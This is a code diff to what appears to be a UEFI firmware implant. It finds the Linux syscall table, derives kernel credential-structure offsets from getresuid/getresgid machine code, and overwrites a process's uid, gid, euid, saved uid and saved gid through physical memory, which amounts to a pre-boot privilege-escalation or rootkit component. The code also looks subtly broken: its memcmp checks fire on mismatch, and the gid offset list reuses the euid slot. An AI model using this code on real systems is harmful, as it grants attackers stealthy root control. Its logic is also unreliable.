@@ -17,6 +17,9 @@
 #define SYS_SETFSUID 122
 #define SYS_SETFSGID 123
 
+#define SYS_GETRESUID 118
+#define SYS_GETRESGID 120
+
 
 struct CredOffsets {
     INT32 task_struct_offset;
@@ -26,6 +29,8 @@ struct CredOffsets {
     UINT8 gid_offset;
     UINT8 euid_offset;
     UINT8 egid_offset;
+    UINT8 suid_offset;
+    UINT8 sgid_offset;
 
     UINT8 fsuid_offset;
     UINT8 fsgid_offset;
@@ -69,7 +74,7 @@ static EFI_STATUS find_syscall_table(EFI_PHYSICAL_ADDRESS *out) {
 }
 
 static EFI_STATUS 
-parse_offsets_from_syscall(EFI_PHYSICAL_ADDRESS syscall_table, UINT64 syscall, INT32 *task_struct_offset, INT32 *creds_struct_offset, UINT8 *cred_offset) {
+parse_task_struct_offsets_from_syscall(EFI_PHYSICAL_ADDRESS syscall_table, UINT64 syscall, INT32 *task_struct_offset, INT32 *creds_struct_offset) {
     EFI_VIRTUAL_ADDRESS syscall_virt = (EFI_VIRTUAL_ADDRESS)((UINT64 *) syscall_table)[syscall];
     EFI_PHYSICAL_ADDRESS syscall_phys = 0;
     EFI_STATUS status = translate_virt_to_phys(syscall_virt, gControlRegs.Cr3Kernel, &syscall_phys);
@@ -87,10 +92,32 @@ parse_offsets_from_syscall(EFI_PHYSICAL_ADDRESS syscall_table, UINT64 syscall, I
             if (creds_struct_offset)
                 *creds_struct_offset = *((INT32 *) (addr + 0x0c));
 
-            if (cred_offset)
-                *cred_offset = *((UINT8 *) (addr + 0x12));
-
             return EFI_SUCCESS;
+        }
+    }
+
+    return EFI_NOT_FOUND;
+}
+
+static EFI_STATUS parse_cred_offsets_from_syscall(EFI_PHYSICAL_ADDRESS syscall_table, UINT64 syscall, UINT8 *offsets[3]) {
+    EFI_VIRTUAL_ADDRESS syscall_virt = (EFI_VIRTUAL_ADDRESS)((UINT64 *) syscall_table)[syscall];
+    EFI_PHYSICAL_ADDRESS syscall_phys = 0;
+    EFI_STATUS status = translate_virt_to_phys(syscall_virt, gControlRegs.Cr3Kernel, &syscall_phys);
+    if (status != EFI_SUCCESS)
+        return status;
+    
+    UINT32 n = 0;
+    for (EFI_PHYSICAL_ADDRESS addr=syscall_phys; addr < (syscall_phys + 0xff); ++addr) {
+        if (memcmp((void *) (addr + 0x00), "\x8b\x73", 2) &&
+            memcmp((void *) (addr + 0x03), "\x48\x8b\xbb", 3)) {
+
+            if (offsets[n])
+                *offsets[n] = *((UINT8 *) (addr + 0x02));
+            n++;
+            if (n == 3)
+                return EFI_SUCCESS;
+
+
         }
     }
 
@@ -129,19 +156,25 @@ static EFI_STATUS parse_fs_offsets_from_syscall(EFI_PHYSICAL_ADDRESS syscall_tab
 static EFI_STATUS resolv_offsets(EFI_PHYSICAL_ADDRESS syscall_table, struct CredOffsets *offsets) {
     EFI_STATUS status = 0;
 
-    status = parse_offsets_from_syscall(syscall_table, SYS_GETUID, &offsets->task_struct_offset, &offsets->creds_offset, &offsets->uid_offset);
+    status = parse_task_struct_offsets_from_syscall(syscall_table, SYS_GETUID, &offsets->task_struct_offset, &offsets->creds_offset);
     if (status != EFI_SUCCESS)
         return status;
 
-    status = parse_offsets_from_syscall(syscall_table, SYS_GETGID, NULL, NULL, &offsets->gid_offset);
+    UINT8 *uoff[3] = {
+        &offsets->uid_offset,
+        &offsets->euid_offset,
+        &offsets->suid_offset
+    };
+    status = parse_cred_offsets_from_syscall(syscall_table, SYS_GETRESUID, uoff);
     if (status != EFI_SUCCESS)
         return status;
 
-    status = parse_offsets_from_syscall(syscall_table, SYS_GETEUID, NULL, NULL, &offsets->euid_offset);
-    if (status != EFI_SUCCESS)
-        return status;
-
-    status = parse_offsets_from_syscall(syscall_table, SYS_GETEGID, NULL, NULL, &offsets->egid_offset);
+    UINT8 *goff[3] = {
+        &offsets->gid_offset,
+        &offsets->euid_offset,
+        &offsets->sgid_offset
+    };
+    status = parse_cred_offsets_from_syscall(syscall_table, SYS_GETRESGID, goff);
     if (status != EFI_SUCCESS)
         return status;
 
@@ -181,7 +214,8 @@ static EFI_STATUS commit_creds(UINT32 uid, UINT32 gid, struct CredOffsets *offse
     UINT32 *gid_ptr  = (UINT32 *) (creds_struct_phys + offsets->gid_offset);
     UINT32 *euid_ptr = (UINT32 *) (creds_struct_phys + offsets->euid_offset);
     UINT32 *egid_ptr = (UINT32 *) (creds_struct_phys + offsets->egid_offset);
-
+    UINT32 *suid_ptr = (UINT32 *) (creds_struct_phys + offsets->suid_offset);
+    UINT32 *sgid_ptr = (UINT32 *) (creds_struct_phys + offsets->sgid_offset);
     UINT32 *fsuid_ptr = (UINT32 *) (creds_struct_phys + offsets->fsuid_offset);
     UINT32 *fsgid_ptr = (UINT32 *) (creds_struct_phys + offsets->fsgid_offset);
 
@@ -191,6 +225,8 @@ static EFI_STATUS commit_creds(UINT32 uid, UINT32 gid, struct CredOffsets *offse
     *egid_ptr = gid;
     *fsuid_ptr = uid;
     *fsgid_ptr = gid;
+    *suid_ptr = uid;
+    *sgid_ptr = gid;
 
     return EFI_SUCCESS;
 }
